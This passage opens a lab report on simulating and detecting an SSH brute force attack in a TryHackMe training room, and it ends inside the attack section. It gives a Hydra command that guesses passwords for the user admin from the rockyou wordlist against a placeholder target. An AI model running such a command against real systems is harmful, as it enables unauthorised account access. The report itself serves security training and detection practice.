\# SSH Brute Force Detection Lab – Technical Report



\## 1. Objective

To simulate and detect an SSH brute force attack on a Linux machine.



\## 2. Lab Environment

\- Platform: TryHackMe ("Brute It" room)

\- Victim: Linux host with SSH exposed

\- Attacker: Kali Linux using Hydra



\## 3. Attack Execution



\*\*Tool:\*\* Hydra  

\*\*Command used:\*\*

```bash

hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://<target-ip>



